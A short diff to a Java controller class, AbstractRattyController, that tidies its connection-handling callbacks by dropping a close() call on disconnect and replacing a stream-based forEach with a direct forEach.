@@ -28,14 +28,12 @@ public abstract class AbstractRattyController implements IServerObserver, IConne
 	@Override
 	public void disconnected(final ActiveConnection connection) {
 		connections.remove(connection);
-		
 		connection.setObserver(null);
-		connection.close();
 	}
 	
 	@Override
 	public void closed(final ActiveServer server) {
-		connections.stream().forEach(connection -> {
+		connections.forEach(connection -> {
 			connection.setObserver(null);
 			connection.close();
 		});
